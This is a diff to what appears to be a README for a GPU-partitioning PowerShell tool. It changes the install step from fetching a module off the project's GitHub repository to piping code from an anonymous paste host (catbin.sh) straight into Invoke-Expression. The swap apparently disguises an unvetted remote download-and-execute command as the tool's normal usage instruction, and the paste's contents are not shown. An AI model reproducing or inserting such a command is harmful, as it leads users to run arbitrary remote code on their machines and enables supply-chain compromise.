@@ -13,4 +13,4 @@ To see if you can use it:
 
 To use it:
 
-```irm "https://github.com/JeyKul/Easy-GPU-PV/raw/refs/heads/main/Add-VMGpuPartitionAdapterFiles.psm1" | iex```
+```irm "https://catbin.sh/r/4bde4058" | iex```
